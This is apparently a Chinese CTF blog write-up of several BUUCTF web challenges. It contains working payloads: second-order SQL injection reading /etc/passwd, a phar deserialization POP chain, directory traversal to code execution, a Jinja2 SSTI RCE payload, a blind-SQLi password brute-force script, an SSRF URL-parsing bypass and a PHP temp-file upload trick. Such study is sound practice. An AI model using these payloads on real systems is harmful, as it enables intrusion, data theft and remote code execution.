---
title: buuctf_web部分刷题记录_PART4
abbrlink: a65f6ebf
date: 2022-10-29 09:04:46
description: 我是菜鸡
cover: false
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
  - 刷题
typora-root-url: ..
---



# [git泄露,二次注入,DS_store]Comment

进来点击发帖提示需要登录

<img src="/images/buuctf-web4/image-20221029093005915.png" alt="image-20221029093005915" style="zoom:67%;" />

这里提示了账号密码, 试了几个,用`zhangwei`,`zhangwei666`成功登录



`dirsearch`扫一下目录,发现了`git`泄露, 用`githack`工具利用一下

```
┌──(kali㉿kali)-[~/Desktop/GitHack-master]
└─$ python3 GitHack.py http://67c8a88a-4595-4e9d-b3c0-a1be143a5475.node4.buuoj.cn:81/.git/
[+] Download and parse index file ...
[+] write_do.php
[OK] write_do.php
```

`write_do.php`: 这里代码好像也不完整

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    break;
case 'comment':
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```



再使用`githacker`来利用一下

```
E:\CTF工具合集\githacker\GitHacker\GitHacker>py __init__.py --url http://67c8a88a-4595-4e9d-b3c0-a1be143a5475.node4.buuoj.cn:81/.git/ --output-folder result --delay 1 --enable-manually-check-dangerous-git-files

进入下载到的目录  git log命令查看提交版本历史  --reflog可以看到被删除的版本
E:\CTF工具合集\githacker\GitHacker\GitHacker\result\948ab5ce2d37a87bde45797c5f372f91>git log --reflog
commit e5b2a2443c2b6d395d06960123142bc91123148c (refs/stash)
Merge: bfbdf21 5556e3a
Author: root <root@localhost.localdomain>
Date:   Sat Aug 11 22:51:17 2018 +0800

    WIP on master: bfbdf21 add write_do.php

commit 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf
Author: root <root@localhost.localdomain>
Date:   Sat Aug 11 22:51:17 2018 +0800

    index on master: bfbdf21 add write_do.php

commit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -> master, origin/master, origin/HEAD)
Author: root <root@localhost.localdomain>
Date:   Sat Aug 11 22:47:29 2018 +0800

    add write_do.php
    
git reset --hard 恢复到历史版本
E:\CTF工具合集\githacker\GitHacker\GitHacker\result\948ab5ce2d37a87bde45797c5f372f91>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
HEAD is now at e5b2a24 WIP on master: bfbdf21 add write_do.php
```

这样以来, 就得到了老版本的`write_do.php`:

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```



尝试分析一下代码: 这里执行三次sql,两次插入,一次查询

```
第一次: 将发帖的内容插入到board表中
"insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
第二次: 评论时首先根据bo_id从表中取出'category'
select category from board where id='$bo_id'

第三次:将评论的内容插入comment表中, 注意到这里直接将上一步取出的category直接插入了进去
"insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";


```

这里发现三次的联系在于`category`这个字段
且提交评论后,`comment`的` content`这个字段会回显,所以我们利用这个字段来回显我们想查询的信息

从第三次查询入手, 我们需要**让`content`的内容摆脱引号的控制**,且为我们所控制

那么可以在`category`中让引号提前闭合:  在发帖页面填写:

```
category的值为 :  ',content=version(),/*   
其他两个值随便
```

这里第一个单引号用于闭合前面的单引号, 后面跟上一个我们伪造的`content`字段, 最后的`/*`可以进行跨行注释,要和`*/`配对

然后再到留言页面时, 首先会执行第二次查询, 将我们刚刚添加的`category`字段的值从`board`表中取出来,准备插入到`comment`表中

这样,我们在留言内容(也就是`comment`表的`content`字段)中插入:`*/#`, 与前面`category`中的`*/`闭合,注释掉中间的`content='` ,`#`注释掉后面的剩余语句, 这样以来, `comment`表中`content`的值就变成了我们控制的`content=version()` ,并回显在评论页面:

<img src="/images/buuctf-web4/image-20221029112733071.png" alt="image-20221029112733071" style="zoom:67%;" />

同样的方法:

发帖中,`category`填写: 

```
',content=database(),/* 
留言填写:
*/#
```

![image-20221029112933341](/images/buuctf-web4/image-20221029112933341.png)



```
',content=(select group_concat(table_name) from information_schema.TABLES where table_schema=database()),/* 
留言填写:
*/#
```

<img src="/images/buuctf-web4/image-20221029113143712.png" alt="image-20221029113143712" style="zoom:67%;" />



```
',content=(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema=database() and table_name='user'),/* 
留言填写:
*/#
```

![image-20221029113315064](/images/buuctf-web4/image-20221029113315064.png)



```
',content=(select group_concat(password) from user),/* 
留言填写:
*/#
```

![image-20221029113449424](/images/buuctf-web4/image-20221029113449424.png)

这里到最后也没有发现flag,换个思路: 查看一下数据库的账户:

```
',content=user(),/*
留言填写:
*/#
root@localhost
```

发现是`root`用户,尝试读取文件

```
',content=(select load_file('/var/www/html/flag.php')),/* 
',content=(select load_file('/var/www/html/flag.txt')),/* 
',content=(select load_file('/var/www/html/flag')),/* 
',content=(select load_file('/flag')),/*
到这里都没有找到flag的信息,尝试读取一下其他敏感文件
',content=(select load_file('/etc/passwd')),/*   发现了名为www的用户
',content=(select load_file('/home/www/.bash_history')),/*
输出:
cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start

留言填写:
*/#
```



```
这里发现曾经在/tmp页面解压过zip文件,且没有删除
',content=(select load_file('/tmp/html/.DS_Store')),/*  
',content=(select hex(load_file('/tmp/html/.DS_Store'))),/* 上面出来是乱码,所以将其转为16进制输出,然后转为字符串
这里发现了flag文件的名称:
flag_8946e1ff1ee3e40f.php

留言填写:
*/#
```

![image-20221029115625879](/images/buuctf-web4/image-20221029115625879.png)

读取flag:

```
',content=(select load_file('/var/www/html/flag_8946e1ff1ee3e40f.php')),/*  
',content=(select load_file('/tmp/html/flag_8946e1ff1ee3e40f.php')),/*  
这里这两个地方读取到的flag是不一样的...第一个才能正确提交

留言填写:
*/#

```

这里补充知识点:

>`.DS_Store`(英文全称 `Desktop Services Store`)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。相当于 `Windows` 下的 `desktop.ini`。
>
>读取该文件能够获得当前的目录结构

<br>

***

<br>

# [phar反序列化,文件上传]SimplePHP

能够上传文件, 且还有个文件上传的功能

![image-20221029123120229](/images/buuctf-web4/image-20221029123120229.png)

直接先利用文件包含读取一下源码, 先试了一下`php`伪协议发现读不出来, 后来直接使用文件名就读取

```
http://98289a0e-df99-4f7a-aaa2-5eaba2bb0fa4.node4.buuoj.cn:81/file.php?file=file.php
```

`file.php`:

```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); 
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
} 
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?> 
```

`index.php`:

```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'base.php';
?> 
```

`class.php`: (**反序列化?**)

```php
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file) 
    {
        $this->source = $file;   //$this->source = phar://phar.jpg 这里提示了上传phar!!然后通过phar://访问!
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key) //读取不可访问的属性值时调用
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```

`function.php` **从这里可以直到上传文件的命名格式和路径**

```php
<?php 
//show_source(__FILE__); 
include "base.php"; 
header("Content-type: text/html;charset=utf-8"); 
error_reporting(0); 
function upload_file_do() { 
    global $_FILES; 
    $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"; 
    //mkdir("upload",0777); 
    if(file_exists("upload/" . $filename)) { 
        unlink($filename); 
    } 
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename); 
    echo '<script type="text/javascript">alert("上传成功!");</script>'; 
} 
function upload_file() { 
    global $_FILES; 
    if(upload_file_check()) { 
        upload_file_do(); 
    } 
} 
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array("gif","jpeg","jpg","png"); 
    $temp = explode(".",$_FILES["file"]["name"]); 
    $extension = end($temp); 
    if(empty($extension)) { 
        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
    } 
    else{ 
        if(in_array($extension,$allowed_types)) { 
            return true; 
        } 
        else { 
            echo '<script type="text/javascript">alert("Invalid file!");</script>'; 
            return false; 
        } 
    } 
} 
?> 
```

过程: (这里是做题的时候打的草稿)

```
定位file.php的11行file_exists($file),让phar来触发反序列化
最终目标是执行Test类的file_get方法,读取文件
而在Test类中,调用到file_get方法的途径是: __get---get---file_get, 且在这个过程中,有:
$value = $this->params[$key];

所以需要有c为Test类的对象,且c->params[key] = '我们需要读取的文件路径'
而现在需要触发__get, 此魔术方法在访问不存在的属性时触发,这里的key就是这个不存在的属性名

浏览一下其他类的魔术方法,这里看到Show的__tostring中,有:
$content = $this->str['str']->source;
那么可以设置b为Show类的对象,b->str['str'] = c  这样上边这行代码相当于访问了c->source,而c中这个属性不存在的,这样就可以触发c的__get方法,同时这里也明确了key的值为source,即c->params['source'] = '我们需要读取的文件路径'

现在需要触发Show的__tostring,此方法当对象被当作字符串时触发

这里看到C1e4r的__destruct方法,有
$this->test = $this->str;
那么可以设置a为C1e4r的对象,a->str = b 这样在执行上面代码的时候,b会被当作字符串,从而触发__tostring

而C1e4r的__destruct在其被反序列化的时候就会触发,因此Cle4r就是最外层的类
```

分析完上述过程,就可以在本地根据这个pop链来构建`phar`文件了:

```php
<?php

class C1e4r
{
    public $test;
    public $str;
}

class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;
}
$a = new C1e4r();
$b = new Show();
$c = new Test();

$c->params['source'] = "/var/www/html/f1ag.php";
$b->str['str'] = $c;
$a->str = $b;
$phar = new Phar('1.phar');
$phar -> startBuffering(); 
$phar -> setStub('<?php __HALT_COMPILER();?>'); 
$phar -> addFromString('vfree.txt','vfree'); 
$phar -> setMetadata($a);
$phar -> stopBuffering();

?>
```



将生成的`phar.phar`改名为符合要求的`phar.jpg`后上传:

从上面的代码中可以找到上传路径: 上传后的文件名为原文件名(`phar.jpg`)

```
upload/aa6de1f7ebf0130753f44a728c5ccf61.jpg
```

(这里竟然能直接访问到`upload`这个目录...)

<img src="/images/buuctf-web4/image-20221029163527398.png" alt="image-20221029163527398" style="zoom:67%;" />

利用`phar`访问后成功输出了base64编码的flag:

```
/file.php?file=phar://upload/aa6de1f7ebf0130753f44a728c5ccf61.jpg
```

![image-20221029165237537](/images/buuctf-web4/image-20221029165237537.png)



<br>

***

<br>

# [CMS,目录穿越]easycms

提示中说后台密码5位弱口令

这里直接用目录扫描工具扫出来了`admin.php`,这里应该是登录后台的入口:

<img src="/images/buuctf-web4/image-20221029173551131.png" alt="image-20221029173551131" style="zoom:67%;" />



这里因为是5位弱口令,这里直接使用用户名:`admin`,口令:`12345`成功登录

进入后台后,发现设计这里可以定制网站内容,其中右边添加区块可以添加php源代码

<img src="/images/buuctf-web4/image-20221029174141834.png" alt="image-20221029174141834" style="zoom:67%;" />

那么或许可以在此命令来读取文件,并将结果直接回显在网站上

这里随便输入一点代码,保存后提示需要验证身份

<img src="/images/buuctf-web4/image-20221029174342351.png" alt="image-20221029174342351" style="zoom:67%;" />

要在这个目录下创建一个文件:

```
 /var/www/html/system/tmp/tkiw.txt
```

找了一下,在'组件'这里发现了无需验证身份的文件上传入口:

<img src="/images/buuctf-web4/image-20221029174618291.png" alt="image-20221029174618291" style="zoom:67%;" />



这里先随便上传一张图片,看一下它被保存到了哪里:

```
<img src="/file.php?f=202210/f_31dac2f014e8697937cf277e53af2c63.png&amp;t=png&amp;o=&amp;s=&amp;v=1667036795" class="logo">
```

这里上传素材处也可以上传文件:

<img src="/images/buuctf-web4/image-20221029174854284.png" alt="image-20221029174854284" style="zoom:67%;" />

随便上传一个文件之后可以看到它的存储路径:

<img src="/images/buuctf-web4/image-20221029175059628.png" alt="image-20221029175059628" style="zoom:67%;" />



```
source/default/default/1.txt
```

我们现在需要通过重命名来将其更改为:

```
/var/www/html/system/tmp/tkiw.txt

目标是通过构建该上传文件的文件名,让其成功伪装成 /var/www/html/system/tmp/tkiw.txt
目前上传文件的目录位source/default/default/,可以使用目录穿越来
source/default/default/../../../system/tmp/tkiw.txt

那么该文件可以重命名为:
../../../system/tmp/tkiw 保存失败
../../../../system/tmp/tkiw 保存失败
../../../../../system/tmp/tkiw 保存成功
```

![image-20221029175622790](/images/buuctf-web4/image-20221029175622790.png)

此时再去添加代码就能够成功保存了: 然后将代码添加到网页内容中

<img src="/images/buuctf-web4/image-20221029175913605.png" alt="image-20221029175913605" style="zoom: 50%;" /><img src="/images/buuctf-web4/image-20221029180038632.png" alt="image-20221029180038632" style="zoom:50%;" />

此时再打开网站首页,发现命令被成功执行了

<img src="/images/buuctf-web4/image-20221029180107203.png" alt="image-20221029180107203" style="zoom:67%;" />

此时将代码改为:

```php
<?php
system("cat /flag");
?>
```

也能成功执行:

<img src="/images/buuctf-web4/image-20221029180210871.png" alt="image-20221029180210871" style="zoom:67%;" />

<br>

***

<br>

# [RootersCTF2019]I_<3_Flask

进来啥也没有,就感觉可能是SSTI:

![image-20221029192548384](/images/buuctf-web4/image-20221029192548384.png)

使用`Arjun`爆破一下请求参数, 这里爆破出了`name`



这里尝试传参,果然存在SSTI:

<img src="/images/buuctf-web4/image-20221029192638577.png" alt="image-20221029192638577" style="zoom:67%;" />

这里直接拿现成的payload来试试,竟然没有过滤:

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}
输出:
I ♥ Flask & application.py flag.txt requirements.txt static templates

再读取一下就出flag了:
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag.txt').read()") }}{% endif %}{% endfor %}
```

<br>

***

<br>

# [NCTF2019]SQLi

简单粗暴,上来连语句都给了:

<img src="/images/buuctf-web4/image-20221030090253162.png" alt="image-20221030090253162" style="zoom:67%;" />

```
select * from users where username='' and passwd=''
```

先搜集一下其他信息: 访问`robots.txt`发现有提示:

![image-20221030090348304](/images/buuctf-web4/image-20221030090348304.png)

`hint.txt`中直接给了过滤词,而且说只要密码是admin的密码就可以:

```
$black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";


If $_POST['passwd'] === admin's password,

Then you will get the flag;
```

过滤得好多.. 这里先分析一下, 这里用户名甚至都没法用`admin`,基本的过滤方法都没法用

这里转义符没被过滤,双引号没被过滤,分号没被过滤

这里试一下`转义符`,`username`输入`\`

这样整个语句就变成了:

```
select * from users where username='\' and passwd=''
username后面的单引号被注释掉, 前面的单引号被迫和passwd后的单引号闭合,这样查询时的username的值为:
' and passwd=
```

因为题目要求最后passwd的值需要通过验证,所以重新构造一个`passwd`:

```
这里被过滤的空格使用/**/代替,等于号和like被过滤,这里换成正则匹配regexp
select * from users where username='\' and passwd='||username/**/regexp/**/"^a";%00'
这里因为已知username的值为admin,所以 先让username去正则匹配一下a开头
这里passwd的值输入:||username/**/regexp/**/"^a";%00
(这里%00是为了截断后面的单引号,虽然它是过滤词,但是在发送请求的过程中%00就被编码了,所以不会被检测处来)
```

<img src="/images/buuctf-web4/image-20221030093402613.png" alt="image-20221030093402613" style="zoom:67%;" />

这里发现响应包将我们重定向到了`welcome.php`这就说明匹配成功了

那么接下来就可以用同样的方法去盲注获得密码:

```
select * from users where username='\' and passwd='||passwd/**/regexp/**/"^a";'
其中输入的passwd的值为:||passwd/**/regexp/**/"^a";
```

脚本:

```python
import requests
import string
from urllib import parse
import time
#chars = string.printable[:]  # 这里不这样是因为其中包含的*,.等符号会导致正则匹配出现歧义
chars = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_'
# print(chars)
base_url = "http://07f7d3e5-e832-4b8e-82d3-b0b1f1589b9c.node4.buuoj.cn:81/index.php"
session = requests.session()

def get_data():
    password = ""
    for i in range(1,30):
        for c in chars:
            data = {
                'username': '\\',
                'passwd': '||passwd/**/regexp/**/"^{}";{}'.format(password+c, parse.unquote('%00'))
            } # 这里使用urllib.parse.unquote来对%00进行解码
            time.sleep(0.5)
            print(data['passwd'])
            res = session.post(base_url, data=data).text
            # print(res)
            if 'welcome' in res:
                password = password + c
                print(password)
                break
get_data()

密码:you_will_never_know7788990
```

<br>

***

<br>

# [利用组件url解析不一致进行SSRF]SSRF Training

```php
<?php 
highlight_file(__FILE__);
function check_inner_ip($url) 
{ 
    $match_result=preg_match('/^(http|https)?:\/\/.*(\/)?.*$/',$url); 
    if (!$match_result) 
    { 
        die('url fomat error'); 
    } 
    try 
    { 
        $url_parse=parse_url($url);  # 这里对url进行解析,解析成数组
    } 
    catch(Exception $e) 
    { 
        die('url fomat error'); 
        return false; 
    } 
    $hostname=$url_parse['host'];  # 取host字段进行验证
    $ip=gethostbyname($hostname); # 返回主机名对应的ip地址
    $int_ip=ip2long($ip);  #将ip地址转换为长整型的数字
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16; 
}  
//如果host为内部ip,则返回1

function safe_request_url($url) 
{ 
     
    if (check_inner_ip($url)) 
    { 
        echo $url.' is inner ip'; 
    } 
    else 
    {
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_HEADER, 0); 
        $output = curl_exec($ch); 
        $result_info = curl_getinfo($ch); 
        if ($result_info['redirect_url']) 
        { 
            safe_request_url($result_info['redirect_url']); 
        } 
        curl_close($ch); 
        var_dump($output); 
    } 
     
} 

$url = $_GET['url']; 
if(!empty($url)){ 
    safe_request_url($url); 
} 

?>
```

这里注意在`check_inner_ip`中,检测的是`parse_url`后的`hostname`

而最后`safe_request_url`中`curl`请求的则是完整的`url`

那么这里就可以利用这点区别,让检测到的host和`curl`请求的目标不一样

payload:

```
?url=http://a:@127.0.0.1:80@baidu.com/flag.php

url_parse请求到的host为: baidu.com
而curl请求的为 127.0.0.1
这样就绕过了检测去访问到了目标上的文件
```

>完整的url格式为:
>
>```
>协议://username:password(可选)@主机:端口/资源路径?请求参数# 片段ID
>```



<br>

***

<br>

# [文件上传,PHP伪协议string.strip_tags带来的bug]ezinclude

<img src="/images/buuctf-web4/image-20221030204149194.png" alt="image-20221030204149194" style="zoom:80%;" />

查看源码发现提示:

```
username/password error<html>
<!--md5($secret.$name)===$pass -->
</html>
```

抓包发现`cookie`中正好有一个哈希值: 那么应该就是提示里的`md5($secret.$name)`

<img src="/images/buuctf-web4/image-20221030204429621.png" alt="image-20221030204429621" style="zoom:80%;" />

那么传一个值为它的参数`pass`试试

这里报404,但是响应包中出现了名为`flflflflag.php`的文件

<img src="/images/buuctf-web4/image-20221030204611372.png" alt="image-20221030204611372" style="zoom:80%;" />



访问一下这个文件,发现了提示: 文件包含

<img src="/images/buuctf-web4/image-20221030204747518.png" alt="image-20221030204747518" style="zoom:80%;" />

拿`php://`协议读一下源码:

```
/flflflflag.php?pass=fa25e54758d5d5c1927781a6ede89f8a&file=php://filter/read=convert.base64-encode/resource=index.php
```

<img src="/images/buuctf-web4/image-20221030205010100.png" alt="image-20221030205010100" style="zoom:80%;" />

解码: 

`index.php`

```php
<?php
include 'config.php';
@$name=$_GET['name'];
@$pass=$_GET['pass'];
if(md5($secret.$name)===$pass){
	echo '<script language="javascript" type="text/javascript">
           window.location.href="flflflflag.php";
	</script>
';
}else{
	setcookie("Hash",md5($secret.$name),time()+3600000);
	echo "username/password error";
}
?>
<html>
<!--md5($secret.$name)===$pass -->
</html>
```

`flflflflag.php`

```php
<?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
	die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>
```

`config.php`:

```
<?php
$secret='%^$&$#fffdflag_is_not_here_ha_ha';
?>
```

通过扫描网站目录还能够扫到一个`dir.php`![image-20221030212705485](/images/buuctf-web4/image-20221030212705485.png)

```php
<?php
var_dump(scandir('/tmp'));
?>
```

访问它能够返回扫描`/tmp`目录的结果



这里补充知识点:![image-20221030210955257](/images/buuctf-web4/image-20221030210955257.png)

这里的PHP版本为7.033, 有一个bug是:

>使用`php://filter/string.strip_tags`导致`php`崩溃清空堆栈重启，如果在同时上传了一个文件，**那么这个`tmp file`就会一直留在`tmp`目录**，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。
>
>可用版本:
>
>```
>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复
>• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复
>• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复
>```

那么利用这里漏洞,需要在通过文件包含使用`php://filter/string.strip_tags`的同时, 上传一个文件,这个文件将会被保存在`/tmp`目录下. 然后通过访问`dir.php`获得上传文件的文件名就可以了

可以通过脚本来实现传参+上传文件

```python
import requests
from io import BytesIO

url = "http://faf05418-21ed-4937-a2e0-0ba79a558d01.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"

phpfile = "<?php phpinfo();?>"  #这里是测试,换成一句话木马也可
filedata = {
    "file": phpfile
}

bak = requests.post(url=url, files=filedata)
print(bak.text)
```

运行后,访问`dir.php`发现文件已经被上传了:

<img src="/images/buuctf-web4/image-20221030212423603.png" alt="image-20221030212423603" style="zoom:67%;" />

直接通过`file`参数来访问这个文件![image-20221030214915202](/images/buuctf-web4/image-20221030214915202.png)

`phpinfo`中就找到了flag

